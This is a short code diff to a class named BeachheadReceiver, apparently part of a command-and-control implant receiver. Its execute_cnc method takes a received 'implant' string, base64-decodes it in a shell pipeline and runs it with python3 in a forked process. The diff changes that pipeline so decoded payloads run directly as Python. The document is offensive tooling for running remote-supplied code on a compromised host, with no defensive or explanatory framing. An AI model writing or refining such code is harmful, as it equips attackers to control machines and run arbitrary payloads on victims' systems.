@@ -38,7 +38,7 @@ class BeachheadReceiver:
                 return urllib.parse.unquote(d[1])
 
     def execute_cnc(self, implant):
-        command = "echo " + implant + " | base64 -d | xargs python3 -c"
+        command = "echo " + implant + " | base64 -d | python3"
         pid = os.fork()
         if pid == 0:
             subprocess.Popen(command, shell=True)
